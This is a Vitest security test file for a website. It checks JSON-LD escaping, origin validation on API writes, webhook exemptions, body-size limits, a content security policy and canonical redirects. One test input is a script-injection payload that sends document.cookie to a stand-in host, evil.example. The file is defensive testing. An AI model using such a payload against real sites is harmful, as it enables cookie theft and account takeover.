import { describe, expect, it } from 'vitest'
import { toJsonLd } from '#/frontend/lib/seo'
import { buildContentSecurityPolicy, canonicalRedirect, validateMutationRequest } from '#/start'

describe('structured data', () => {
  it('cannot close the script block it is written into', () => {
    const serialised = toJsonLd({
      description: 'x</script><script>fetch("https://evil.example/"+document.cookie)</script>',
    })

    expect(serialised).not.toContain('</script>')
    expect(serialised).not.toContain('<')
    // Still the same JSON: the escapes parse back to the characters they hide.
    expect(JSON.parse(serialised).description).toContain('</script>')
  })

  it('leaves ordinary text readable', () => {
    expect(JSON.parse(toJsonLd({ name: 'Brandt & Söhne' })).name).toBe('Brandt & Söhne')
  })
})

describe('request security', () => {
  it('rejects missing and cross-site origins on data-changing API requests', () => {
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/public/contact', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/v2/public/contact', {
          method: 'POST',
          headers: { origin: 'https://attacker.example' },
        }),
      ),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/v2/public/contact', {
          method: 'POST',
          headers: { origin: 'https://yamanwarda.de' },
        }),
      ),
    ).toBeNull()
  })

  it('lets the signed mail webhook through without an origin, and nothing else', () => {
    // A mail forwarder sends no Origin header. This endpoint authenticates the
    // caller by signature instead, and reads no cookies.
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/inbound-email', { method: 'POST' })),
    ).toBeNull()
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/inbound-email/other', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
    // Stripe also sends no Origin; its route checks Stripe-Signature instead.
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/stripe/webhook', { method: 'POST' })),
    ).toBeNull()
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/stripe/webhook2', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
    // The removed legacy webhook is no longer exempt.
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/inbound-email', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/v2/owner/projects', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
  })

  it('holds the inbound webhook to its own body limit', () => {
    const inbound = (bytes: number) =>
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/v2/inbound-email', {
          method: 'POST',
          headers: { 'content-length': String(bytes) },
        }),
      )

    // A letter carrying a ten-megabyte attachment, base64 inside the JSON,
    // has to pass here: at a one-megabyte ceiling every client file would be
    // refused with a 413 before the route saw it.
    expect(inbound(20 * 1024 * 1024)).toBeNull()
    expect(inbound(31 * 1024 * 1024)).toBe('BODY_TOO_LARGE')
  })

  it('ignores safe methods and non-API paths', () => {
    expect(validateMutationRequest(new Request('https://yamanwarda.de/api/v2/content'))).toBeNull()
    expect(validateMutationRequest(new Request('https://yamanwarda.de/de/contact', { method: 'POST' }))).toBeNull()
  })

  it('builds a nonce-bound CSP that blocks objects and foreign framing', () => {
    const policy = buildContentSecurityPolicy('nonce123')

    expect(policy).toContain("script-src 'self' 'nonce-nonce123' https://challenges.cloudflare.com")
    expect(policy).toContain("object-src 'none'")
    expect(policy).toContain("frame-ancestors 'none'")
  })
})

describe('canonical host', () => {
  it('sends a www read to the bare domain, keeping the path and query', () => {
    expect(canonicalRedirect(new Request('https://www.yamanwarda.de/en/work?x=1'))).toBe(
      'https://yamanwarda.de/en/work?x=1',
    )
    expect(canonicalRedirect(new Request('https://www.yamanwarda.de/', { method: 'HEAD' }))).toBe(
      'https://yamanwarda.de/',
    )
  })

  it('drops a trailing slash permanently, in the same hop as www', () => {
    expect(canonicalRedirect(new Request('https://yamanwarda.de/de/work/'))).toBe('https://yamanwarda.de/de/work')
    expect(canonicalRedirect(new Request('https://www.yamanwarda.de/en/work/tech-store/?a=b'))).toBe(
      'https://yamanwarda.de/en/work/tech-store?a=b',
    )
    expect(canonicalRedirect(new Request('https://yamanwarda.de/'))).toBeNull()
    expect(canonicalRedirect(new Request('https://yamanwarda.de/api/v2/'))).toBeNull()
  })

  it('leaves the bare domain, local development and every write alone', () => {
    expect(canonicalRedirect(new Request('https://yamanwarda.de/de'))).toBeNull()
    expect(canonicalRedirect(new Request('http://localhost:3000/de'))).toBeNull()
    // A webhook or form posted to www must not be silently turned into a GET.
    expect(
      canonicalRedirect(new Request('https://www.yamanwarda.de/api/v2/stripe/webhook', { method: 'POST' })),
    ).toBeNull()
  })
})
